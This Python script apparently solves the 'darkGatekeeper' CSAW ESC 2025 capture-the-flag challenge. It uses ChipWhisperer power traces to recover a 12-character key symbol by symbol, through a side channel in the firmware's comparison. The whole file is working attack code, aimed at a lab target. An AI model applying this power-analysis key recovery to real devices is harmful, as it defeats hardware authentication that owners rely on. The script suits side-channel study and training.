import chipwhisperer as cw
import numpy as np
import string
import sys

PLATFORM = "CWNANO"
#PLATFORM = "CWLITEARM"
PROG_TYPE = cw.programmers.STM32FProgrammer

#TARGET_BIN_PATH = f"../../targets/darkGatekeeper/darkGatekeeper-{PLATFORM}.hex"
TARGET_BIN_PATH = f"../../../csaw_esc_2025/challenges/set2/darkGatekeeper-CWNANO.hex"

RESPONSE_LEN = 18
SYMBOLS = string.digits + string.ascii_letters + string.punctuation
THRESHOLD = 0.7 # For CWLITE it's ~0.3

# Sets up scope and target
def cw_setup():
    scope = cw.scope()
    target = cw.target(scope, cw.targets.SimpleSerial)
    scope.default_setup()

    cw.program_target(scope, PROG_TYPE, TARGET_BIN_PATH)

    return scope, target

# Sends message, returns response from the target and captured trace
def send(scope: cw.scopes.ScopeTypes, target: cw.targets.TargetTypes, msg: str) -> tuple[bytearray, np.ndarray]:
    scope.arm()

    target.simpleserial_write('a', msg.encode('ascii'))

    timeout = scope.capture()
    if timeout:
        print("mehhh, scope.capture timed out")

    response = target.simpleserial_read('r', RESPONSE_LEN, timeout=2000)
    trace = scope.get_last_trace()

    # idle state should be cut off from the trace
    return response, trace[:200]


if __name__ == "__main__":
    scope, target = cw_setup()

    # getting the first trace - should be incorrect on the first symbol
    key = "\0\0\0\0\0\0\0\0\0\0\0\0"
    res, trace = send(scope, target, key)
    queries = 1

    # better safe than sorry
    if res != bytearray(b'Access Denied.....'):
        print("Something sus: the initial guess for the key is b'\x00'*12, it should not work")
        scope.dis()
        target.dis()
        sys.exit(0)

    trace_with_most_correct_guesses = trace

    # master_key's lenght is 12
    for i in range(12):
        for sym in SYMBOLS:

            # replacing one symbol in the key
            msg = key[:i] + sym + key[i + 1:]

            res, new_trace = send(scope, target, msg)
            queries += 1
            if res != bytearray(b'Access Denied.....'):
                print()
                print(f"Flag found: {res}")
                print(f"Key found:  {msg}")
                print(f"stats:")
                print(f"\t Number of queries: {queries}")
                print(f"\t Euclidean distance threshold: {THRESHOLD}")


                scope.dis()
                target.dis()
                sys.exit(0)

            # Euclidean distance should be enough, as there is no need for any alignment between traces
            distance = np.linalg.norm(trace_with_most_correct_guesses - new_trace)
            # print(msg, distance)
            if distance > THRESHOLD:

                # new_trace is a trace with correctly guessed symbols from 0 to i.
                trace_with_most_correct_guesses = new_trace

                # re-writing the key with the correct symbol
                key = msg
                break

    
    print("if we end up here, I have a really bad news for you")
    print("re-check your threshold, bc no key was found")
    print(f"current stats: guessed key: {key}, threshold: {THRESHOLD}, num of queries: {queries}")

    scope.dis()
    target.dis()
